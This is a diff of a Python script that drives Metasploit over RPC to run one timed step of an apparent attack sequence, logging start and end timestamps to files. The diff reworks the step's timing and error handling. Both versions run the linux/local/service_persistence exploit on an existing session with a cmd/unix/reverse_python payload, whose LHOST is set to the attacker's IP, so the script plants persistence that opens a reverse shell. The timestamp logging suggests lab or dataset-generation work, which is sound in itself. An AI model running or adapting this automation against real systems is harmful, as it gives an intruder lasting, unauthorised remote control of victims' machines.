@@ -11,9 +11,6 @@ def record_timestamp(folder, output_time_file):
 
 
 def main(argv):
-    if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
-
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
@@ -21,26 +18,29 @@ def main(argv):
     client = MsfRpcClient('kali')
     
     # start step 5
-    output_time_file_start = 'time_step_5_start.txt'
+    output_time_file_start = 'time_step_4_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(2)
+    time.sleep(60)
+    
+    try:
+        exploit = client.modules.use('exploit', 'linux/local/service_persistence')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+        exploit['SESSION'] = 1
+        exploit['VERBOSE'] = True
+        payload['LHOST'] = my_ip
 
-    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    exploit['SESSION'] = 1
-    exploit['VERBOSE'] = True
-    payload['LHOST'] = my_ip
+        exploit.execute(payload=payload)
 
-    exploit.execute(payload=payload)
 
-    while client.jobs.list:
-        time.sleep(1)
-
-    client.sessions.session('1').stop()
-    client.sessions.session('2').stop()
-
-    time.sleep(30)
-    output_time_file_end = 'time_step_5_end.txt'
+        client.sessions.session('1').stop()
+        client.sessions.session('2').stop()
+    
+    except Exception as e:
+        print(e)
+        pass
+    
+    time.sleep(60)
+    output_time_file_end = 'time_step_4_end.txt'
     record_timestamp(folder, output_time_file_end)
     time.sleep(30)
 
